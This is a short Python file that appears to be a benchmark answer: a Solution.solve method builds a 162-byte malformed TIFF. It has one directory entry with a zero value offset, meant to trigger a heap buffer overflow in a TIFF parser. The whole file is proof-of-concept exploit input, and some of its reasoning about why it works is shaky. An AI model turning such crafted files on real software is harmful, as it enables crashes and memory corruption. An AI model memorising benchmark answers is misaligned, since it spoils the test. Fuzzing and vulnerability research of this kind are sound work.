import os
import struct
import tempfile
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a malformed TIFF file with invalid offline tags
        # that have value offset of zero to trigger heap buffer overflow
        
        # TIFF header (Little-endian)
        # Byte order: II (little-endian)
        # Magic number: 42
        # First IFD offset: 8 (right after header)
        tiff_header = b'II\x2A\x00\x08\x00\x00\x00'
        
        # IFD structure for a single directory entry
        # Number of directory entries: 1
        ifd_count = struct.pack('<H', 1)
        
        # Create a malformed directory entry
        # Tag: 0x00FE (SubfileType) - common tag that could be problematic
        # Type: 4 (LONG)
        # Count: Large value to trigger overflow
        # Value offset: 0 (invalid, causing heap buffer overflow)
        tag = struct.pack('<H', 0x00FE)
        type_code = struct.pack('<H', 4)  # LONG
        count = struct.pack('<I', 100)    # Large count to overflow
        value_offset = struct.pack('<I', 0)  # Zero offset - invalid
        
        directory_entry = tag + type_code + count + value_offset
        
        # Next IFD offset: 0 (end of IFD chain)
        next_ifd = struct.pack('<I', 0)
        
        # Build the PoC
        poc = tiff_header + ifd_count + directory_entry + next_ifd
        
        # Pad to exactly 162 bytes (ground truth length)
        # Add dummy data to reach required length
        padding_length = 162 - len(poc)
        if padding_length > 0:
            poc += b'A' * padding_length
        
        return poc[:162]  # Ensure exactly 162 bytes